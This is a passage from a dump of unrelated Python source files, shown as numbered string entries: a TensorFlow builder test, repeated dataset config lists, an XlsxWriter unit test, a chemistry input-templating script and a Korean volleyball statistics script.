calc['negFlag'])\n\t\t\tfor switchname in opLeds:\n\t\t\t\tif CP.switchSetting(switchname):\n\t\t\t\t\tCP.setLedState(opLeds[switchname], PiDP_CP.LED_ON)\n\t\t\t\telse:\n\t\t\t\t\tCP.setLedState(opLeds[switchname], PiDP_CP.LED_OFF)\n\t\t\tCP.lightAllLeds(loops=5)\t# light up the LEDs again\n\t\t\tupdateScreen(stdscr, calc)\n\ncurses.wrapper(main)\nstdscr.clear()\nGPIO.cleanup()\n", "260": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "261": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "262": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "263": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "264": "TRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    # 'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    # 'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    # 'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    # 'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    # 'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]\n", "265": "###############################################################################\n#\n# Tests for XlsxWriter.\n#\n# Copyright (c), 2013-2020, John McNamara, jmcnamara@cpan.org\n#\n\nimport unittest\nfrom ...compatibility import StringIO\nfrom ...workbook import Workbook\n\n\nclass TestWriteCalcPr(unittest.TestCase):\n    \"\"\"\n    Test the Workbook _write_calc_pr() method.\n\n    \"\"\"\n\n    def setUp(self):\n        self.fh = StringIO()\n        self.workbook = Workbook()\n        self.workbook._set_filehandle(self.fh)\n\n    def test_write_calc_pr(self):\n        \"\"\"Test the _write_calc_pr() method.\"\"\"\n\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_calc_mode_auto_except_tables(self):\n        \"\"\"\n        Test the _write_calc_pr() method with the calculation mode set\n        to auto_except_tables.\n\n        \"\"\"\n\n        self.workbook.set_calc_mode(\"auto_except_tables\")\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_calc_mode_manual(self):\n        \"\"\"\n        Test the _write_calc_pr() method with the calculation mode set to\n        manual.\n\n        \"\"\"\n\n        self.workbook.set_calc_mode(\"manual\")\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_write_calc_pr(self):\n        \"\"\"Test the _write_calc_pr() method with non-default calc id.\"\"\"\n\n        self.workbook.set_calc_mode(\"auto\", 12345)\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def tearDown(self):\n        self.workbook.fileclosed = 1\n", "266": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# ==== Libraries ====\nimport os\n\n\n# ==== Functions ====\ndef replace_allnew(astr, bstr, dict):\n    with open(astr, 'r') as afile:\n        with open(bstr, 'w') as bfile:\n            data = afile.read()\n            for key, value in dict.items():\n                data = data.replace(key, str(value))\n            bfile.write(data)\n    return data\n\n\ndef getWaters(afile):\n    nWaters = \"\"\n    with open(afile, 'r') as bfile:\n        nWaters = int(bfile.read())\n    return nWaters\n\n\ndef getMultCharge(afile):\n\n    with open(afile, 'r') as afile:\n        text = afile.read()\n        startloc = text.rfind(\"$molecule\\n\") + len(\"$molecule\\n\")\n        good = [int(d) for d in text[startloc:].split(\"\\n\")[0].split()]\n    return good[0], good[1]\n\ndef read_input_file_dict(start_dir, paramFile = 'input_file_specs.txt'):\n    calcDict = {}\n    #What happens if we want a single point energy and need a different input file? \n    parameter_file = os.path.join(start_dir, paramFile)\n\n    with open(parameter_file, 'rb') as inpFile:\n        for line in inpFile:\n            key_string = '{#'+line.split(' = ')[0].strip()+'}'\n            value_string = line.split(' = ')[-1].strip()\n            calcDict[key_string] = value_string\n    if calcDict['{#IMP_SOLV}'] == 'SMD':\n        calcDict['{#IMP_SOLV}'] = \"%cosmo smd true \\nend\"\n        calcDict['{#IMP_SOLV_NAME}'] = \"SMD\"\n    else: \n        calcDict['{#IMP_SOLV}'] = \"%cosmo epsilon 80.4\\nrefrac 1.33\\nend\"\n        calcDict['{#IMP_SOLV_NAME}'] = \"COSMO\"\n\n    return calcDict\n\ndef read_input_file_dict_with_rxn(paramFile = 'input_file_specs.txt'):\n    calcDict = {}\n    #What happens if we want a single point energy and need a different input file? \n    rxn_flag = 0\n    param_flag = 0\n    calcDict['WORKDIR'] = '/'.join(paramFile.split('/')[:-1])\n    with open(paramFile, 'rb') as inpFile:\n        for line in inpFile:\n            if '$RXN_LIST' in line:\n                rxn_flag = 1\n                calcDict['RXN_LIST'] = []\n                continue\n            if '$PARAMETERS' in line: \n                rxn_flag = 0\n                param_flag = 1 \n                continue\n            if rxn_flag:\n                if 'END' in line:\n                    rxn_flag = 0\n                    continue\n                else:\n                    calcDict['RXN_LIST'].append(line.strip())\n            if param_flag:\n                if \"END\" in line:\n                    param_flag = 0\n                else:\n                    key_string = '{#'+line.split(' = ')[0].strip()+'}'\n                    value_string = line.split(' = ')[-1].strip()\n                    calcDict[key_string] = value_string\n\n    #Implicit solvation details\n    if calcDict['{#IMP_SOLV}'] == 'SMD':\n        calcDict['{#IMP_SOLV}'] = \"%cosmo smd true \\nend\"\n        calcDict['{#IMP_SOLV_NAME}'] = \"SMD\"\n    else: \n        calcDict['{#IMP_SOLV}'] = \"%cosmo epsilon 80.4\\nrefrac 1.33\\nend\"\n        calcDict['{#IMP_SOLV_NAME}'] = \"COSMO\"\n\n    #Dispersion correction details: \n    if calcDict['{#DISPERSION}'] == 'NONE':\n        calcDict['{#DISPERSION}'] = ''\n\n    #Basis set and input template details\n    if calcDict['{#BASIS}'] == 'P6_31G':\n        calcDict['{#BASIS}'] = '_6_31G'\n        calcDict['{#TEMPLATE_INP}'] = 'template_input_pople.inp'\n    elif calcDict['{#BASIS}'] == 'def2_SVP':\n        calcDict['{#BASIS}'] = 'def2-SVP'\n    elif calcDict['{#BASIS}'] == 'def2_TZVP':\n        calcDict['{#BASIS}'] = 'def2-TZVP'       \n\n    return calcDict\n\ndef read_input_file_dict_SPE(paramFile = 'input_file_specs.txt'):\n    calcDict = {}\n    #What happens if we want a single point energy and need a different input file? \n    rxn_flag = 0\n    param_flag = 0\n    calcDict['WORKDIR'] = '/'.join(paramFile.split('/')[:-1])\n    with open(paramFile, 'rb') as inpFile:\n        for line in inpFile:\n            if '$RXN_LIST' in line:\n                rxn_flag = 1\n                calcDict['RXN_LIST'] = []\n                continue\n            if '$PARAMETERS' in line: \n                rxn_flag = 0\n                param_flag = 1 \n                continue\n            if rxn_flag:\n                if 'END' in line:\n                    rxn_flag = 0\n                    continue\n                else:\n                    calcDict['RXN_LIST'].append(line.strip())\n            if param_flag:\n                if \"END\" in line:\n                    param_flag = 0\n                else:\n                    key_string = '{#'+line.split(' = ')[0].strip()+'}'\n                    value_string = line.split(' = ')[-1].strip()\n                    calcDict[key_string] = value_string\n\n    #Implicit solvation details\n    if calcDict['{#IMP_SOLV}'] == 'SMD':\n        calcDict['{#IMP_SOLV}'] = \"%cosmo smd true \\nend\\n\"\n        calcDict['{#IMP_SOLV_NAME}'] = \"SMD\"\n    elif calcDict['{#IMP_SOLV}'] == 'NONE':\n        calcDict['{#IMP_SOLV}'] = ''\n        calcDict['{#IMP_SOLV_NAME}'] = \"NONE\"\n    else: \n        calcDict['{#IMP_SOLV}'] = \"%cosmo epsilon 80.4\\nrefrac 1.33\\nend\\n\"\n        calcDict['{#IMP_SOLV_NAME}'] = \"COSMO\"\n\n    #Dispersion correction details: \n    if calcDict['{#DISPERSION}'] == 'NONE':\n        calcDict['{#DISPERSION}'] = ''\n\n    #Basis set and input template details\n    if calcDict['{#BASIS}'] == 'P6_31G':\n        calcDict['{#BASIS}'] = '_6_31G'\n    elif calcDict['{#BASIS}'] == 'def2_SVP':\n        calcDict['{#BASIS}'] = 'def2-SVP'\n    elif calcDict['{#BASIS}'] == 'def2_TZVP':\n        calcDict['{#BASIS}'] = 'def2-TZVP'\n    elif calcDict['{#BASIS}'] == 'cc_pVTZ_cc_pVTZ_C':\n        calcDict['{#BASIS}'] = 'cc-pVTZ cc-pVTZ/C'\n    elif calcDict['{#BASIS}'] == 'cc_pVDZ_cc_pVDZ_C':\n        calcDict['{#BASIS}'] = 'cc-pVDZ cc-pVDZ/C'     \n\n    if calcDict['{#METHOD}'] == 'DLPNO_CCSDT':\n        calcDict['{#METHOD}'] = 'DLPNO-CCSD(T)'\n        calcDict['{#MISCELLANEOUS}'] = \"%mdci\\nTCutPNO 3.33e-7\\nTCutPairs 1e-4\\nTCutMKN 1e-3\\nend\\n\"\n        calcDict['{#MEMORY}'] = '13000' \n    elif calcDict['{#METHOD}'] == 'DLPNO_CCSD':\n        calcDict['{#METHOD}'] = 'DLPNO-CCSD'\n        calcDict['{#MISCELLANEOUS}'] = \"%mdci\\nTCutPNO 3.33e-7\\nTCutPairs 1e-4\\nTCutMKN 1e-3\\nend\\n\"\n        calcDict['{#MEMORY}'] = '13000'\n    else:\n        calcDict['{#MISCELLANEOUS}'] = ''\n        calcDict['{#MEMORY}'] = '8000'\n\n\n    return calcDict\n\ndef seedMagic(start_dir, calcDict, template_inp='template_input.inp', template_job='template_job.sl', water_file='numWat.txt', charge_file='solute.qcinp'):\n    \n    '''\n    READ IN INPUTS FROM A FILE!\n    '''\n\n    template_inp = calcDict['{#TEMPLATE_INP}']\n    template_job = calcDict['{#TEMPLATE_JOB}']\n\n    #required files for magical seeding. \n    charge_file = \"solute.qcinp\"\n    geom_file = \"solute.xyz\"\n    water_file = 'numWat.txt'\n    req_files = [geom_file, water_file, charge_file]\n    \n    for root, dir, files in os.walk(start_dir):\n        if set(req_files).issubset(set(files)):\n            print(\"Seeding %s\" % root)\n            # get required info\n            calcDict['{#NWATERS}'] = getWaters(os.path.join(root, water_file))\n            calcDict['{#CHARGE}'], calcDict['{#MULT}'] = getMultCharge(\n                os.path.join(root, charge_file))\n            calcDict['{#MOLNAME}'] = root.split('/')[-2]\n            calcDict['{#CONFNUM}'] = int(root.split('/')[-1].split('_')[1])\n            calcDict['{#PROTNUM}'] = int(root.split('/')[-1].split('_')[2])\n            calcDict['{#TITLE}'] = \"molecule %s, conformer # %d and protonation = %d \" % (\n                calcDict['{#MOLNAME}'],\n                calcDict['{#CONFNUM}'], calcDict['{#PROTNUM}'])\n            calcDict['{#STARTDIR}'] = root\n            \n            if not calcDict['{#JOB_TYPE}'] == 'SPE':\n                calcDict[\"{#NAME}\"] = \"%s_%s_%s\" % (\n                    calcDict['{#METHOD}'].split('/')[0].split()[0], calcDict['{#MOLNAME}'], calcDict['{#IMP_SOLV_NAME}'].split('(')[0])\n                calcDict['{#XYZFILE}'] = geom_file\n            \n            else:\n                calcDict[\"{#NAME}\"] = \"%s_%s_%s_SPE\" % (\n                    calcDict['{#METHOD}'].split('-')[0], calcDict['{#MOLNAME}'], calcDict['{#IMP_SOLV_NAME}'].split('(')[0])\n            \n                optName = \"%s_%s_%s\" % (\n                    calcDict['{#GO_METHOD}'].split('-')[0], calcDict['{#MOLNAME}'], calcDict['{#GO_IMP_SOLV}'].split('(')[0])\n                opt_geom_file = optName + '_opt.xyz'\n                calcDict['{#XYZFILE}'] = opt_geom_file\n            \n            calcDict[\"{#FULLPATH}\"] = os.path.join(root, calcDict[\"{#NAME}\"])\n\n            new_job = os.path.join(root, \"%s.sl\" % calcDict[\"{#NAME}\"])\n            new_inp = os.path.join(root, \"%s.inp\" % calcDict[\"{#NAME}\"])\n           \n            # create new pbs and inp files\n            \n            replace_allnew(template_job, new_job, calcDict)\n            replace_allnew(template_inp, new_inp, calcDict)\n\n", "267": "from volleyball.stat.Chance import Chances\nfrom volleyball.stat.StatMaker import *\nfrom volleyball.scraper.LinkProcessor import LinkProcessor\nimport statistics\n\n\nlink_processor = LinkProcessor(\n    [LinkProcessor.WOMEN], [LinkProcessor.REGULAR_SEASON, LinkProcessor.PLAY_OFF, LinkProcessor.SEMI_PLAY_OFF, LinkProcessor.CHAMP]\n    , list(range(2020, 2021))\n    , list(range(1, 3000)))\nlink_processor.make_round_number()\nstat = Stat(link_processor.links)\n\nstat.fill_games()\nstat.fill_sets()\nstat.fill_messages()\nstat.fill_rallies()\nstat.fill_chances()\n\ndirect_induce_EffCalc = EffCalc({})\n\nreceive_over_induce_EffCalc = EffCalc({})\n\naccurate_receive_induce_EffCalc = EffCalc({})\n\nserve_EffCalc = EffCalc({})\n\naccurate_receive_chance_EffCalc = EffCalc({})\n\nreceive_chance_EffCalc = EffCalc({})\n\naccurate_receive_rally_EffCalc = EffCalc({})\n\nreceive_rally_EffCalc = EffCalc({})\n\ndirect_effect = EffCalc({})\n\njust_next = EffCalc({})\n\n\ndef make_effect(messages: List[Messages], chances: Chances, rallies: Rallies, game: Game, set_in_game: set):\n    direct_chances = chances.select_direct_chance(messages)\n    for chance in direct_chances:\n        serve_chance = chances.select_near_chance(chance, True, 1)\n        direct_induce_EffCalc.append_effect_calc(messages[serve_chance.side].slice_messages_with_chance(serve_chance), game, \"\uc11c\ube0c\uc885\ud569\")\n\n    receive_over_chances = chances.select_receive_over_chance(messages)\n    for chance in receive_over_chances:\n        serve_chance = chances.select_near_chance(chance, True, 1)\n        receive_over_induce_EffCalc.append_effect_calc(messages[serve_chance.side].slice_messages_with_chance(serve_chance), game, \"\uc11c\ube0c\uc885\ud569\")\n\n    accurate_receive_chances = chances.select_accurate_receive_chance(messages)\n    for chance in accurate_receive_chances:\n        serve_chance = chances.select_near_chance(chance, True, 1)\n        accurate_receive_induce_EffCalc.append_effect_calc(messages[serve_chance.side].slice_messages_with_chance(serve_chance), game, \"\uc11c\ube0c\uc885\ud569\")\n\n    serve_EffCalc.append_effect_calc(messages[0], game, \"\uc11c\ube0c\uc885\ud569\")\n    serve_EffCalc.append_effect_calc(messages[1], game, \"\uc11c\ube0c\uc885\ud569\")\n\n    for chance in chances:\n        messages_in_chance = messages[chance.side].slice_messages_with_chance(chance)\n        for message in messages_in_chance:\n            if isinstance(message, ReceiveMessage) and message.success_failure == Message.SUCCESS:\n                accurate_receive_chance_EffCalc.append_effect_calc(messages_in_chance\n                                                                   , game\n                                                                   , \"\uacf5\uaca9\uc885\ud569\")\n            if isinstance(message, ReceiveMessage):\n                receive_chance_EffCalc.append_effect_calc(messages_in_chance, game, \"\uacf5\uaca9\uc885\ud569\")\n\n    for rally in rallies:\n        messages_in_rally = messages[0].slice_messages_with_rallies([rally])\n        for message in messages_in_rally:\n            if isinstance(message, ReceiveMessage) and message.success_failure == Message.SUCCESS:\n                accurate_receive_rally_EffCalc.append_effect_calc(messages_in_rally, game, \"\uacf5\uaca9\uc885\ud569\")\n            if isinstance(message, ReceiveMessage):\n                receive_rally_EffCalc.append_effect_calc(messages_in_rally\n                                                         , game\n                                                         , \"\uacf5\uaca9\uc885\ud569\")\n\n    for rally in rallies:\n        messages_in_rally = messages[1].slice_messages_with_rallies([rally])\n        for message in messages_in_rally:\n            if isinstance(message, ReceiveMessage) and message.success_failure == Message.SUCCESS:\n                accurate_receive_rally_EffCalc.append_effect_calc(messages_in_rally, game, \"\uacf5\uaca9\uc885\ud569\")\n            if isinstance(message, ReceiveMessage):\n                receive_rally_EffCalc.append_effect_calc(messages_in_rally\n                                                         , game\n                                                         , \"\uacf5\uaca9\uc885\ud569\")\n\n    for index, chance in enumerate(chances):\n        if index == len(chances) - 1:\n            break\n        if chance.message_index[0] == chance.message_index[1] \\\n            and isinstance(messages[chance.side][chance.message_index[0]], ReceiveMessage) \\\n            and isinstance(messages[chance.other_side()][chances[index + 1].message_index[0]], AttackMessage):\n            direct_effect.append_effect_calc(\n                Messages([messages[chance.other_side()][chances[index + 1].message_index[0]]])\n                , game\n                , \"\uacf5\uaca9\uc885\ud569\")\n\n    for index, chance in enumerate(chances):\n        if index == len(chances) - 1:\n            break\n        if chance.message_index[0] == chance.message_index[1] \\\n            and isinstance(messages[chance.side][chance.message_index[0]], ReceiveMessage) \\\n            and isinstance(messages[chance.other_side()][chances[index + 1].message_index[0]], DigMessage):\n            just_next.append_effect_calc(\n                messages[chance.other_side()][chances[index + 1].message_index[0]: chances[index + 1].message_index[1] + 1]\n                , game\n                , \"\uacf5\uaca9\uc885\ud569\")\n\n\nstat.process_in_set(make_effect)\n\ndirect_induce_EffCalc.print_effect_with_name(prefix=\"\ub2e4\uc774\ub809\ud2b8 \uc720\ub3c4\")\nreceive_over_induce_EffCalc.print_effect_with_name(prefix=\"\ub9ac\uc2dc\ube0c \ub118\uc5b4\uac10\")\naccurate_receive_induce_EffCalc.print_effect_with_name(prefix=\"\uc0c1\ub300 \ub9ac\uc2dc\ube0c \uc815\ud655\")\nserve_EffCalc.print_effect_with_name(prefix=\"\uc11c\ube0c \uc885\ud569\", at_least=250)\nprint(\"-\" * 100)\ndirect_induce_EffCalc.print_overall_effect(prefix=\"\ub2e4\uc774\ub809\ud2b8 \uc720\ub3c4\")\nreceive_over_induce_EffCalc.print_overall_effect(prefix=\"\ub9ac\uc2dc\ube0c \ub118\uc5b4\uac10\")\naccurate_receive_induce_EffCalc.print_overall_effect(prefix=\"\uc0c1\ub300 \ub9ac\uc2dc\ube0c \uc815\ud655\")\nserve_EffCalc.print_overall_effect(prefix=\"\uc11c\ube0c \uc885\ud569\")\nserve_Eff = []\n\n\ndef serve_eff_formula(player: Player, serve_stat: List[int]) -> str:\n    if serve_stat[0] >= 200:\n        serve_Eff.append(((serve_stat[1] - serve_stat[2] + serve_stat[3] * 0.6 + serve_stat[4] * 0.3 - serve_stat[5] * 0.35 - (serve_stat[0] - serve_stat[1] - serve_stat[2] - serve_stat[3] - serve_stat[4] - serve_stat[5]) * 0.25) / serve_stat[0] * 1000) / 10)\n    return f\"{int((serve_stat[1] - serve_stat[2] + serve_stat[3] * 0.6 + serve_stat[4] * 0.3 - serve_stat[5] * 0.35 - (serve_stat[0] - serve_stat[1] - serve_stat[2] - serve_stat[3] - serve_stat[4] - serve_stat[5]) * 0.25) / serve_stat[0] * 1000) / 10}%\\\n{serve_stat[0]}/{serve_stat[1]}/{serve_stat[2]}/{serve_stat[3]}/{serve_stat[4]}/{serve_stat[5]}/{serve_stat[0] - serve_stat[1] - serve_stat[2] - serve_stat[3] - serve_stat[4] - serve_stat[5]}\"\n\n\nserve_EffCalc.print_multiple_eff_calc(\n    True, [direct_induce_EffCalc, receive_over_induce_EffCalc, accurate_receive_induce_EffCalc], serve_eff_formula, prefix=\"\uc804\uccb4 \uc11c\ube0c \ud6a8\uc728\")\n\nserve_EffCalc.print_multiple_eff_calc(\n    False, [direct_induce_EffCalc, receive_over_induce_EffCalc, accurate_receive_induce_EffCalc], serve_eff_formula, prefix=\"\uc804\uccb4 \uc11c\ube0c \ud6a8\uc728\"\n)\n\nprint(statistics.median(serve_Eff), \" \uc911\uc559\uac12\\n\")\n\naccurate_receive_chance_EffCalc.print_overall_effect(prefix=\"\ub9ac\uc2dc\ube0c \uc815\ud655 \ucc2c\uc2a4 \uacf5\uaca9 \ud6a8\uc728\")\naccurate_receive_rally_EffCalc.print_overall_effect(prefix=\"\ub9ac\uc2dc\ube0c \uc815\ud655 \ub7a0\ub9ac \uacf5\uaca9 \ud6a8\uc728\")\n\nreceive_chance_EffCalc.print_overall_effect(prefix=\"\ub9ac\uc2dc\ube0c \ucc2c\uc2a4 \uacf5\uaca9 \ud6a8\uc728\")\nreceive_rally_EffCalc.print_overall_effect(prefix=\"\ub9ac\uc2dc\ube0c \ub7a0\ub9ac \uacf5\uaca9 \ud6a8\uc728\")\n\ndirect_effect.print_overall_effect(prefix=\"\ub2e4\uc774\ub809\ud2b8 